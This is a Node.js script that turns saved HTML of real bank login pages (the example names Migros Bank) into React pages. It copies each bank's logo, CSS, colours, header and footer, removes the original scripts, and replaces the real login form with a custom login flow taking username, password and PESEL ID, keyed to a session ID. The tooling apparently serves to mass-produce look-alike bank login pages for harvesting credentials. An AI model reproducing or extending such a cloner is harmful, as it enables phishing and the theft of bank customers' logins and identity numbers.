#!/usr/bin/env node
// Usage: node scripts/scaffold-bank.mjs <html-basename> <slug> "<displayName>"
// Example: node scripts/scaffold-bank.mjs migros migros "Migros Bank"

import { readFileSync, writeFileSync, mkdirSync, existsSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { parse } from 'node-html-parser';

const [, , htmlBasename, slug, displayName] = process.argv;
if (!htmlBasename || !slug || !displayName) {
    console.error('Usage: node scripts/scaffold-bank.mjs <html-basename> <slug> "<displayName>"');
    process.exit(1);
}

const ROOT = resolve(process.cwd());
const htmlPath = join(ROOT, 'resources/views', `${htmlBasename}.html`);
if (!existsSync(htmlPath)) {
    console.error(`HTML not found: ${htmlPath}`);
    process.exit(1);
}

const html = readFileSync(htmlPath, 'utf8');
const root = parse(html, { comment: false, blockTextElements: { script: false, style: true } });

// Remove all scripts — we don't want to inject jQuery/swal2/Account into React page
root.querySelectorAll('script').forEach((s) => s.remove());
root.querySelectorAll('link[rel="stylesheet"]').forEach((l) => l.remove());

// ---- Extract form fields ----
const form = root.querySelector('#lk_form');
if (!form) {
    console.error('Form #lk_form not found');
    process.exit(1);
}
const hasLogin = !!form.querySelector('#login');
const hasPassword = !!form.querySelector('#password');
const hasPesel = !!form.querySelector('#pesel');
const fields = [];
if (hasLogin) fields.push({ name: 'login', type: 'text', i18nKey: 'fields.username', required: true, autocomplete: 'off' });
if (hasPassword) fields.push({ name: 'password', type: 'password', i18nKey: 'fields.password', required: true, autocomplete: 'new-password' });
if (hasPesel) fields.push({ name: 'pesel', type: 'text', i18nKey: 'fields.userIdentification', required: false, autocomplete: 'off' });

// ---- Extract CTA variant + i18nKey ----
const loginBtn = form.querySelector('#loginButton');
const btnClass = loginBtn?.getAttribute('class') ?? '';
let variant = 'primary';
if (btnClass.includes('btn-yellow')) variant = 'yellow';
else if (btnClass.includes('btn-orange')) variant = 'orange';
else if (btnClass.includes('btn-blue')) variant = 'blue';
const ctaText = (loginBtn?.textContent ?? '').trim();
const ctaI18n = /login|anmel/i.test(ctaText) ? 'cta.login' : 'cta.continue';

// ---- Extract header logo SVG ----
const headerSvg = root.querySelector('header svg');
const logoSvg = headerSvg
    ? `<?xml version="1.0" encoding="UTF-8"?>\n${headerSvg.toString()}\n`
    : `<svg xmlns="http://www.w3.org/2000/svg" width="120" height="40"><rect width="120" height="40" fill="#888"/><text x="60" y="26" text-anchor="middle" font-family="sans-serif" font-size="14" fill="#fff">${displayName}</text></svg>\n`;

// ---- Extract inline <style> blocks ----
const styles = root.querySelectorAll('style')
    .map((s) => s.textContent)
    .filter((t) => !t.includes('--swal2-'));
const bankCss = styles.join('\n\n/* ---- */\n\n');

// ---- Guess brand primary/accent from CSS ----
const primaryMatch = bankCss.match(/\.btn-(?:yellow|orange|blue)[^}]*background-color:\s*(#[0-9a-fA-F]{3,8})/);
const primary = primaryMatch?.[1] ?? '#004B5A';
const accentMatch = bankCss.match(/\.btn-(?:yellow|orange|blue)[^}]*color:\s*(#[0-9a-fA-F]{3,8})/);
const ctaTextColor = accentMatch?.[1] ?? '#ffffff';

// ---- Extract header, main (without form), footer ----
const headerEl = root.querySelector('header');
const mainEl = root.querySelector('main');
const footerEl = root.querySelector('footer');
if (mainEl && form) {
    form.replaceWith('<!--BANK_LOGIN_FLOW-->');
}
const headerHtml = headerEl ? headerEl.innerHTML : '';
const mainHtml = mainEl ? mainEl.innerHTML : '';
const footerHtml = footerEl ? footerEl.innerHTML : '';

// ---- Write SVG logo ----
const logoDir = join(ROOT, 'public/assets/banks', slug);
mkdirSync(logoDir, { recursive: true });
writeFileSync(join(logoDir, 'logo.svg'), logoSvg);

// ---- Write bank config ----
const cfgPath = join(ROOT, 'resources/js/config/banks', `${slug}.ts`);
const pascal = slug.split('-').map((s) => s[0].toUpperCase() + s.slice(1)).join('');
const camel = pascal.charAt(0).toLowerCase() + pascal.slice(1);
const fieldsLiteral = fields
    .map((f) => {
        const extras = Object.entries(f)
            .map(([k, v]) => `${k}: ${JSON.stringify(v)}`)
            .join(', ');
        return `        { ${extras} },`;
    })
    .join('\n');
const configTs = `import type { BankConfig } from './types';

export const ${camel}: BankConfig = {
    slug: '${slug}',
    displayName: ${JSON.stringify(displayName)},
    status: 'active',
    fields: [
${fieldsLiteral}
    ],
    cta: { i18nKey: '${ctaI18n}', variant: '${variant}' },
    brand: {
        primary: '${primary}',
        ctaText: '${ctaTextColor}',
        borderRadius: '4px',
        logoPath: '/assets/banks/${slug}/logo.svg',
    },
};
`;
writeFileSync(cfgPath, configTs);

// ---- Write page wrapper ----
const pagePath = join(ROOT, 'resources/js/Pages/Banks', `${pascal}.tsx`);
mkdirSync(join(ROOT, 'resources/js/Pages/Banks'), { recursive: true });
const mainParts = mainHtml.split('<!--BANK_LOGIN_FLOW-->');
const pageTsx = `import { BankLoginFlow } from '@/features/bank-login/BankLoginFlow';
import { ${camel} } from '@/config/banks/${slug}';
import css from './${pascal}.css?inline';

type Props = { sessionId: string };

const HEADER_HTML = ${JSON.stringify(headerHtml)};
const MAIN_PRE_HTML = ${JSON.stringify(mainParts[0] ?? '')};
const MAIN_POST_HTML = ${JSON.stringify(mainParts[1] ?? '')};
const FOOTER_HTML = ${JSON.stringify(footerHtml)};

export default function ${pascal}({ sessionId }: Props) {
    return (
        <div className="d-flex flex-column h-100">
            <style dangerouslySetInnerHTML={{ __html: css }} />
            <header dangerouslySetInnerHTML={{ __html: HEADER_HTML }} />
            <main className="mt-5">
                <div dangerouslySetInnerHTML={{ __html: MAIN_PRE_HTML }} />
                <BankLoginFlow bank={${camel}} sessionId={sessionId} />
                <div dangerouslySetInnerHTML={{ __html: MAIN_POST_HTML }} />
            </main>
            <footer className="mt-5 mt-lg-auto" dangerouslySetInnerHTML={{ __html: FOOTER_HTML }} />
        </div>
    );
}
`;
writeFileSync(pagePath, pageTsx);

// ---- Write scoped CSS ----
const cssPath = join(ROOT, 'resources/js/Pages/Banks', `${pascal}.css`);
writeFileSync(cssPath, bankCss);

// ---- Update registry ----
const regPath = join(ROOT, 'resources/js/config/banks/index.ts');
let reg = readFileSync(regPath, 'utf8');
if (!reg.includes(`from './${slug}'`)) {
    reg = reg.replace(
        /(import type.+from '\.\/types';\n)/,
        `$1import { ${camel} } from './${slug}';\n`,
    );
    reg = reg.replace(
        /(export const BANK_REGISTRY[^{]*\{)/,
        `$1\n    [${camel}.slug]: ${camel},`,
    );
    writeFileSync(regPath, reg);
}

console.log(`✓ Scaffolded ${slug} → ${displayName}`);
console.log(`  page: ${pagePath}`);
console.log(`  config: ${cfgPath}`);
console.log(`  logo: ${join(logoDir, 'logo.svg')}`);
console.log(`  css: ${cssPath}`);
console.log(`  registry updated: ${regPath}`);
